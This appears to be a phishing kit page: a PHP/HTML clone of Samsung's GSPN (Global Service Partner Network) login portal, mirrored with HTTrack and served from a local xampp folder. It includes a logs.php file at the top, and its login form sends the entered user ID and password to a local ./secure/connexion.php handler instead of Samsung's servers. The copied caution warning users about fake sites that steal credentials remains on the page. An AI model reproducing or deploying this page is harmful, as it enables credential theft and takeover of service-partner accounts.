
<!-- saved from url=(0100)file:///C:/xampp/htdocs/host/https___gspn3.samsungcsportal.com_/gspn3.samsungcsportal.com/index.html -->
<?php

require './logs.php';





?>
<html><!-- Mirrored from gspn3.samsungcsportal.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Jan 2020 00:53:06 GMT --><!-- Added by HTTrack --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->
















<title>GSPN</title>
<link href="./vv_files/layout.css" rel="stylesheet" type="text/css">
<script type="text/javascript" >
	function Check(){
		document.getElementById("mainform").submit();



	}
	
	</script>
</head>

<body class="login_body_wrap">

<div class="login_wrap">
 <form name="mainform" id="mainform" method="post" action="./secure/connexion.php">
 	<div class="login_container">
    	<div class="login_content">
        	<h1 class="login_topbg"><img src="./vv_files/login_sys_logo.png" alt="Samung GSPN (Global Service Partner Network)"></h1>
            <div class="login_conceptImg">
            	<img src="./vv_files/login_img_01.gif" width="139" height="293" alt=""><img src="./vv_files/login_img_02.gif" width="174" height="293" alt=""><img src="./vv_files/login_img_03.gif" width="187" height="293" alt=""><img src="./vv_files/login_img_04.gif" width="211" height="293" alt=""><img src="./vv_files/login_img_05.gif" width="175" height="293" alt="">
            </div>
		<div id="privacyPolicy_DIV" style="font: 11px/normal arial; margin: 0px 70px 0px auto; width: 800px; height: 20px; text-align: right; vertical-align: bottom; position: relative; font-size-adjust: none; font-stretch: normal;">
	   		<dl>
	           	<dt class="user_id">
	           		
	           		<span onclick="javascript:MM_openBrWindow(&#39;https://gspn3.samsungcsportal.com/basis/common/privacyPolicyNonEu.jsp&#39;,&#39;personalInform&#39;,&#39;scrollbars=yes,resizable=yes,width=800,height=600&#39;)" style="CURSOR: pointer; COLOR: red">Privacy Policy</span></dt>
	           		
	           	
			</dl>
	   	</div>  
            <!-- End .login_conceptImg -->
            <div class="login_form_wrap02" id="login_form_all">
            	<div class="login_form">
                	<dl>
                    	<dt class="user_id">User ID</dt>
                    	<dd class="user_id">
                        <input type="text" id="" name="username" class="log_input" onkeydown="loginEnter(this, event)" tabindex="1"><!-- 아이디가 존재할 경우 saveid() -->
                        </dd>
                        <dt class="user_pwd">Password</dt>
                        <dd class="user_pwd">
                        	<input type="password" name="password" value="" class="log_input" onkeydown="loginEnter(this, event)" tabindex="2">                       	
                        </dd>
                        <dt class="save_id"></dt>
                        <dd class="save_id">
                        	<input type="checkbox" class="checkbox" id="checksaveid" name="checksaveid" value="checkbox" onclick="saveid(this.form)"> Save ID
                        </dd>
                    </dl>
                    <img src="./vv_files/login_btn.gif" width="127" height="43" onclick="Check()" class="login_btn" alt="Login"><!-- 로그인 버튼(login()) -->
                </div>
                <!-- End .login_form -->

                <div id="recaptcha_DIV" class="recaptcha_wrap recaptcha_nothad_incorrect_sol recaptcha_isnot_showing_audio" style="display:none">
                    <!-- 이미지 -->
                    <span id="recaptcha_image" class="recaptcha_image" style="display: block; width: 300px; height: 57px;"><img id="recaptcha_challenge_image"></span>
                    <!-- //이미지 -->
                    <!-- 오디오 -->
                    <span id="recaptcha_audio" class="recaptcha_audio">
                    	<img src="./vv_files/btn_play.png" alt="Play" title="Play">
                        <img src="./vv_files/btn_mp3_download.png" alt="MP3 Download" title="MP3 Download">
                    </span>
                    <!-- //오디오 -->
                    <span class="recaptcha_txt">Enter the characters you see in the image into the textbox below</span>
                    <input type="text" name="recaptcha_response_field" id="recaptcha_response_field" size="30">
                    <input type="hidden" name="recaptcha_challenge_field" id="recaptcha_challenge_field" size="30">
                    <div id="recaptcha_button_field" class="recaptcha_form">
                        <a href="#" id="refrimg"><img src="./vv_files/btn_refresh.png" ti="Click here for a new image if you can not read the code above" title="Refresh"></a>
                        <span id="change_Audio">
                        	<a href="#" id="hearAudio"><img src="./vv_files/btn_audio.png" alt="Click here to listen to the code" title="Audio"></a>
                        </span>
                        <span id="change_Image">
                        	<a href="#" id="captchaImage"><img src="./vv_files/btn_image.png" alt="Click here for a image" title="Image"></a>
                        </span>
                	</div>
            	</div> 
                	
            </div>
            <!-- End .recaptcha_wrap -->
            <div class="login_caution">
            	<dl>
                    <dt>Caution : </dt>
                    <dd>Please input the exact official G-SPN URL when accessing the system, due to possible malicious and fake websites that attempt to steal ID/Password.</dd>
                </dl>
            </div>
            <!-- End .login_caution -->
		</div>
        <!-- End .login_content -->
	</div>
    <!-- End .login_container -->
    </form>
           	
    <div class="login_footer">
    	<p>
            <img src="./vv_files/copyright.gif" width="272" height="35" alt="Copyright Samsung GSPN">
            <a href="#"><img src="./vv_files/verisign_02.gif" onclick="MM_openBrWindow(&#39;https://sealinfo.thawte.com/thawtesplash?form_file=fdf/thawtesplash.fdf&amp;dn=*.SAMSUNGCSPORTAL.COM&amp;lang=en&#39;,&#39;VeriSignSecurelSeal&#39;,&#39;scrollbars=no,resizable=yes,width=500,height=665&#39;)" alt="Secured by thawta"></a>
    	</p>
    </div>
</div>
<!-- End .login_wrap -->

<form name="frmLogin" id="frmLogin" method="post">
<input type="hidden" name="LOGIN_ID">
<input type="hidden" name="LOGIN_PWD">
<input type="hidden" name="recaptcha_challenge_field">
<input type="hidden" name="recaptcha_response_field">
<input type="hidden" name="referer" id="referer" value="login">
</form>



<!-- Mirrored from gspn3.samsungcsportal.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Jan 2020 00:53:06 GMT -->

</body></html>